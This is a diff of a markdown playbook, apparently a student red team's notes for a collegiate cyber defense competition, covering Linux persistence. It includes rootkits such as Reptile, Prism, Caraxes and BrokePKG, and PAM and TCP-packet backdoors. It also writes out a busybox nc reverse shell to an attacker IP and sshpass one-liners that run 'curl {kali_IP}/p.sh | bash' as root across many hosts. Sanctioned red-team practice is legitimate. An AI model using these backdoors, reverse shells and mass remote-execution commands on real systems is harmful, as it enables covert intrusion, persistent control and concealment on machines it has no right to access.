@@ -78,31 +78,22 @@ pagetitle: Red Teaming for CCDC
     - Then update GP with `gpupdate /force`
 
 **Linux:**
-- Our persistence script
-  - Linux < 4.x
-    - Pam backdoor (out is /opt/bds/pam_out)
-    - Reptile rootkit with bds prefix
-    - Prism backdoor
-    - tty0 backdoor
-  - Linux 5.x/6.x
-    - Pam backdoor
-    - BDS with bds prefix (comes with pingable backdoor)
 - [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
-  - Get something going for alpine
-    - Add a second location for SSH keys 
-    - Add another user via /etc/passwd
-  - Test Nixos?
-- [Boopkit](https://github.com/krisnova/boopkit)
-  - Sneaky amazing backdoor that functions via back checksum TCP packets
-  - `wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.4.1.tar.gz`
-    - `apt install clang make bpftool libbpf-dev gcc-multilib llvm libxdp-dev libpcap-dev`
-  - Then, run on victim with `boopkit -i {network_interface} -q`
-    - We need to find a way to get the default network interface
-  - Then, after making on Kali, can run `boopkit-boop -rhost {target} -rport 3535 -c '{command}' -lhost {kali_IP} -lport {kali_port}`
-    - E.g. `sudo boopkit-boop -lhost 192.168.204.130 -lport 4444 -rhost 192.168.204.139 -rport 3535 -c 'busybox nc 192.168.204.130 4444 -e bash'`
-  - Listens on TCP 3545 
+  - Replace prism with Waterfall
+  - Get something going for alpine/RHEL/Nixos
+    - Write a general script which determines version and then executes the other scripts
+    - Alpine
+      - Add a second location for SSH keys 
+    - Nixos
+      - Figure out which PAM file controls auth and modify it
+  - Scripting across teams
+    - Running commands with SSH by putting it after the command
+      - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S id"`
+      - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
+        - This will work regardless of whether the password is actually required
+    - One-liners to generate IPs
 - [Prism](https://github.com/andreafabrizi/prism)
   - `gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c` or if that fails just download and run `prism`
   - Then run `sudo python2 sendPacket.py {target_IP} {password} {attacker_IP} {attacker_port}`
@@ -140,16 +131,6 @@ pagetitle: Red Teaming for CCDC
       - Works with both adding users to `/etc/passwd` and cron jobs
         - Actually, having some trouble getting it working with cron jobs
       - However, ssh seems resistant. Can't seem to permit root logins with a hidden line or add an hidden authorized keys file
-- [Caraxes](https://github.com/ait-aecid/caraxes/)
-  - Seems to be pretty good for 5.14-6.11, but a bit lacking on functionality
-    - This one would make a nice starting place for building our own
-  - Will need to uncomment the `hide_module()` function
-  - Good for hiding files - we can set the word to hide in `rootkit.h`
-- [BrokePKG](https://github.com/R3tr074/brokepkg)
-  - Install dependencies with `./scripts/dependencies.sh`
-  - Config in `./include/config.h`
-  - Seems to work on 5.x and 6.x? Less functionality than BDS, but a good backup
-
 
 ## Domain Persistence
 
